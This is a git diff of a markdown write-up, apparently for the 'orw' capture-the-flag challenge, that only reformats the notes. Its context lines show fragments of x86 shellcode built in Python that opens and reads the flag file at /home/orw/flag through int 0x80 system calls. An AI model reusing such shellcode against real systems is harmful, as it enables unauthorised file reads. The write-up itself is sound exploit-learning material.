@@ -104,10 +104,10 @@ path is `/home/orw/flag`, 14 bytes.
 		shellcode += 'push '+ temp + '\n'
 		```
 
-		- call open('esp')
-			eax: 5
-			ebx: buf(esp)
-			call
+		- call `open('esp')`
+			- eax: 5
+			- ebx: buf(esp)
+			- call
 		
 		```py
 		shellcode += 'push 0x5\n pop eax\n'
@@ -115,11 +115,11 @@ path is `/home/orw/flag`, 14 bytes.
 		shellcode += 'int 0x80\n'
 		```
 		
-		- call read('eax', 'esp', 0x50)
-			eax: 3
-			ebx: eax(fd)
-			ecx: esp(buf)
-			edx: 0x50(len)
+		- call `read('eax', 'esp', 0x50)`
+			- eax: 3
+			- ebx: eax(fd)
+			- ecx: esp(buf)
+			- edx: 0x50(len)
 		
 		```py
 		shellcode += 'mov ebx, eax\n'
